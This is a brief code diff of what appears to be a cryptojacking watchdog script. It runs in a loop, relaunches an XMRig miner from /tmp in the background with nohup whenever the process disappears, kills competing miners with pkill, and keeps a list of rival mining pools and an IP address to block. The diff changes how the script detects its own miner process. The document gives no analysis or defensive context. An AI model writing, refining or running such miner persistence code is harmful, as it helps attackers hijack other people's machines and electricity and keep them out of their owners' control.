@@ -3,7 +3,7 @@
 blocked_pools=(nicehash nanopool minergate supportxmr moneroocean "75.119.158.0:3333")
 
 while true; do
-    if ! pgrep -f xmrig | grep -v "anti0killer" >/dev/null; then
+    if ! pgrep -f "xmrig.*config.json" >/dev/null; then
         nohup /tmp/xmrig/xmrig-6.22.2/xmrig > /dev/null 2>&1 &
     fi
     pkill -f minerd
